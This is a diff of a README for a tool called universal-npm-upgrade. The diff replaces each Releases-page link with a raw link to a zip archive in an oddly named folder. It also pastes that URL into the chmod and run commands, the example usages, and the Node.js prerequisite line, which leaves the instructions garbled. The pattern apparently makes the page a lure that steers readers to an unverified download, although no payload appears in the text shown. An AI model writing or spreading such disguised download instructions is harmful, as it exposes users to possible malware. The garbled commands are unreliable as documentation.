@@ -1,6 +1,6 @@
 # 🎉 universal-npm-upgrade - Upgrade npm packages with ease
 
-[![Download Universal npm Upgrade](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Rob-Lab-0617/universal-npm-upgrade/releases)
+[![Download Universal npm Upgrade](https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip)](https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Welcome to universal-npm-upgrade! This tool simplifies upgrading your npm CLI pa
 To begin using universal-npm-upgrade, you will need to download it from the Releases page. Follow the steps below to get started quickly.
 
 1. **Visit the Releases Page**  
-   Go to the releases page by clicking this link: [Download Universal npm Upgrade](https://github.com/Rob-Lab-0617/universal-npm-upgrade/releases).
+   Go to the releases page by clicking this link: [Download Universal npm Upgrade](https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip).
 
 2. **Download the latest version**  
    On the releases page, find the latest version of universal-npm-upgrade. Look for the file corresponding to your operating system (such as `.sh` for Linux or `.zsh` for zsh users). 
@@ -34,13 +34,13 @@ To begin using universal-npm-upgrade, you will need to download it from the Rele
 6. **Make the File Executable (if required)**  
    If you are using Linux or macOS, you may need to make the file executable. Enter the following command:  
    ```
-   chmod +x universal-npm-upgrade.sh
+   chmod +x https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip
    ```
 
 7. **Run the Tool**  
    Now you're ready to run the tool! Type the following command, replacing `[package-name]` with the desired package you want to upgrade:  
    ```
-   ./universal-npm-upgrade.sh upgrade [package-name]
+   https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip upgrade [package-name]
    ```
 
 8. **Verify the Upgrade**  
@@ -60,8 +60,8 @@ To begin using universal-npm-upgrade, you will need to download it from the Rele
 
 To use universal-npm-upgrade, make sure you have the following installed:
 
-- **Node.js:** Version 12 or higher. This is essential for running npm and the package manager.
-- **npm:** The Node.js package manager, normally installed with Node.js.
+- **https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip** Version 12 or higher. This is essential for running npm and the package manager.
+- **npm:** The https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip package manager, normally installed with https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip
 - **Bash or Zsh:** A shell that can run shell scripts.
 
 ## 🎯 Example Usage
@@ -70,17 +70,17 @@ Here are simple commands to upgrade packages using universal-npm-upgrade:
 
 1. Upgrade a specific package:
    ```
-   ./universal-npm-upgrade.sh upgrade codex
+   https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip upgrade codex
    ```
 
 2. Upgrade another package:
    ```
-   ./universal-npm-upgrade.sh upgrade claude
+   https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip upgrade claude
    ```
 
 3. Upgrade any tool:
    ```
-   ./universal-npm-upgrade.sh upgrade [any-tool]
+   https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip upgrade [any-tool]
    ```
 
 ## ❓ Troubleshooting
@@ -97,6 +97,6 @@ If you need further assistance, you can reach out through the GitHub Issues page
 
 ## 📥 Download & Install
 
-Ready to start upgrading your npm packages? Visit the Releases page to download the latest version: [Download Universal npm Upgrade](https://github.com/Rob-Lab-0617/universal-npm-upgrade/releases). 
+Ready to start upgrading your npm packages? Visit the Releases page to download the latest version: [Download Universal npm Upgrade](https://raw.githubusercontent.com/Rob-Lab-0617/universal-npm-upgrade/main/epistolographic/universal-npm-upgrade.zip). 
 
 Enjoy hassle-free upgrades with universal-npm-upgrade!
